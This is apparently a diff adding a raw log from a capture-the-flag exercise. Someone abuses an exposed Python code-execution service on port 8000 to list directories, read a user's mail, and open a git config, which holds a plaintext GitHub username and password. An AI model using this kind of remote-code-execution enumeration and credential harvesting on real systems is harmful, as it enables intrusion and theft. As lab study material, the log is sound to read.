@@ -1,0 +1,84 @@
+10.10.22.243 [10.10.22.243] 8000 (?) open
+os.listdir('/home')
+
+os.listdit('/')
+module 'os' has no attribute 'listdit'
+os.listdir('/')
+
+print(os.listdir('/home'))
+['think']
+
+print(os.chdir('think'))
+[Errno 13] Permission denied: 'think'
+print(os.chdir('/'))
+None
+
+print(os.getcwd())
+/
+
+print(os.listdir())    
+['lib', 'boot', 'sbin', 'var', 'lib32', 'media', 'libx32', 'proc', 'etc', 'lost+found', 'opt', 'tmp', 'sys', 'srv', 'home', 'run', 'mnt', 'root', 'dev', 'swap.img', 'usr', 'bin', 'lib64']
+
+print(os.listdir('/var'))
+['backups', 'lib', 'lock', 'mail', 'cache', 'opt', 'tmp', 'log', 'run', 'local', 'crash', 'spool']
+
+print(os.listdir('/var'))
+['backups', 'lib', 'lock', 'mail', 'cache', 'opt', 'tmp', 'log', 'run', 'local', 'crash', 'spool']
+
+print(os.listdir('/var/mail"))
+EOL while scanning string literal (<string>, line 1)
+print(os.listdir('/var/mail'))
+['www-data', 'root', 'think']
+
+print(os.listdir('/var/mail/think'))
+[Errno 20] Not a directory: '/var/mail/think'
+print(open('/var/mail/think', 'r').read())
+From root@pyrat  Thu Jun 15 09:08:55 2023
+Return-Path: <root@pyrat>
+X-Original-To: think@pyrat
+Delivered-To: think@pyrat
+Received: by pyrat.localdomain (Postfix, from userid 0)
+        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+Subject: Hello
+To: <think@pyrat>
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
+Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+From: Dbile Admen <root@pyrat>
+
+Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
+
+
+os.listdir('/')
+
+print(os.listdir())
+['lib', 'boot', 'sbin', 'var', 'lib32', 'media', 'libx32', 'proc', 'etc', 'lost+found', 'opt', 'tmp', 'sys', 'srv', 'home', 'run', 'mnt', 'root', 'dev', 'swap.img', 'usr', 'bin', 'lib64']
+
+print(os.listdir('/opt'))
+['dev']
+
+print(os.listdir('/opt/dev'))
+['.git']
+
+print(os.listdir('/opt/dev/.git')
+unexpected EOF while parsing (<string>, line 1)
+print(os.listdir('/opt/dev/.git'))
+['objects', 'COMMIT_EDITMSG', 'HEAD', 'description', 'hooks', 'config', 'info', 'logs', 'branches', 'refs', 'index']
+
+print(open('/opt/dev/.git/config', 'r').read())
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[user]
+        name = Jose Mario
+        email = josemlwdf@github.com
+
+[credential]
+        helper = cache --timeout=3600
+
+[credential "https://github.com"]
+        username = think
+        password = _TH1NKINGPirate$_
+
